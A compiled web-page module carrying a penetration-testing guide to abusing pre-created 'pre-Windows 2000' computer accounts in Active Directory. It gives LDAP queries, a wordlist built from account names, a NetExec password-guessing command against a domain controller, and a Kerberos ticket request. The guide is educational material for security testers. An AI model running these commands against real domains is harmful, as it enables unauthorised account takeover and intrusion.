import{_ as e,c as t,a5 as a,o as i}from"./chunks/framework.B5CpDqM0.js";const d=JSON.parse('{"title":"Pre-Windows 2000 computers","description":"","frontmatter":{"authors":"ShutdownRepo, mpgn"},"headers":[],"relativePath":"ad/movement/builtins/pre-windows-2000-computers.md","filePath":"ad/movement/builtins/pre-windows-2000-computers.md","lastUpdated":1724982529000}'),n={name:"ad/movement/builtins/pre-windows-2000-computers.md"};function r(h,s,p,o,l,c){return i(),t("div",null,s[0]||(s[0]=[a(`<h1 id="pre-windows-2000-computers" tabindex="-1">Pre-Windows 2000 computers <a class="header-anchor" href="#pre-windows-2000-computers" aria-label="Permalink to &quot;Pre-Windows 2000 computers&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>When a new computer account is configured as &quot;pre-Windows 2000 computer&quot;, its password is set based on its name (i.e. lowercase computer name without the trailing <code>$</code>). When it isn&#39;t, the password is randomly generated.</p><p>Once an authentication occurs for a pre-Windows 2000 computer, according to <a href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/" target="_blank" rel="noreferrer">TrustedSec&#39;s blogpost</a>, its password will usually need to be changed.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>Finding computer accounts that have been &quot;pre-created&quot; (i.e. manually created in <a href="https://blog.netwrix.com/2017/01/30/active-directory-users-and-computers-aduc/" target="_blank" rel="noreferrer">ADUC</a> instead of automatically added when joining a machine to the domain), but have never been used can be done by filtering the <code>UserAccountControl</code> attribute of all computer accounts and look for the value 4128 (32|4096) (deductible via the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties" target="_blank" rel="noreferrer">UserAccountControl</a> flags):</p><ul><li>32 - <code>PASSWD_NOTREQD</code></li><li>4096 - <code>WORKSTATION_TRUST_ACCOUNT</code></li></ul><p>The <code>logonCount</code> attribute can be filtered as well.</p><p>The <a href="https://github.com/yaap7/ldapsearch-ad" target="_blank" rel="noreferrer">ldapsearch-ad</a> tool can be used to find such accounts. Once &quot;pre-created&quot; computer accounts that have not authenticated are found, they should be usable with their lowercase name set as their password. This can be tested with <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noreferrer">NetExec</a> (Python) for instance.</p><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1. find pre-created accounts that never logged on</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ldapsearch</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ad </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">l $LDAP_SERVER </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">d $DOMAIN </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">u $USERNAME </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">p $PASSWORD </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">t search </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">s </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;(&amp;(userAccountControl=4128)(logonCount=0))&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> tee results.txt</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2. extract the sAMAccountNames of the results</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">cat results.txt </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">|</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> grep </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;sAMAccountName&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> awk </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;{print $4}&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> tee computers.txt</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3. create a wordlist of passwords matching the Pre-Windows 2000 generation, based on the account names</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">cat results.txt </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">|</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> grep </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;sAMAccountName&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> awk </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;{print tolower($4)}&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> tr </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">d </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;$&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> tee passwords.txt</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 4. bruteforce, line per line (user1:password1, user2:password2, ...)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">nxc smb $DC_IP </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">u </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;computers.txt&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">p </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;passwords.txt&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> --</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">no</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">bruteforce</span></span></code></pre></div><blockquote><p>You will see the error message STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT when you have guessed the correct password for a computer account that has not been used yet. (<a href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/" target="_blank" rel="noreferrer">trustedsec.com</a>)</p></blockquote><p>Testers can then change the Pre-Windows 2000 computer accounts&#39; password (i.e. <a href="https://github.com/SecureAuthCorp/impacket/pull/1304" target="_blank" rel="noreferrer">rpcchangepwd.py</a>, <a href="https://github.com/SecureAuthCorp/impacket/pull/1189" target="_blank" rel="noreferrer">kpasswd.py</a>, etc.) in order to use it.</p><div class="success custom-block"><p>Alternatively, Filip Dragovic was able to authenticate using Kerberos without having to change the account&#39;s password. (<a href="https://twitter.com/filip_dragovic/status/1524730451826511872" target="_blank" rel="noreferrer">source</a>)</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">getTGT.py</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $DOMAIN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$COMPUTER_NAME</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">:</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$COMPUTER_PASSWORD</span></span></code></pre></div><p>The ticket obtained can then be used with <a href="./../kerberos/ptt">ptt.md</a></p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/" target="_blank" rel="noreferrer">https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/</a></p><p><a href="https://web.archive.org/web/20080205233505/http://support.microsoft.com/kb/320187" target="_blank" rel="noreferrer">https://web.archive.org/web/20080205233505/http://support.microsoft.com/kb/320187</a></p>`,16)]))}const u=e(n,[["render",r]]);export{d as __pageData,u as default};
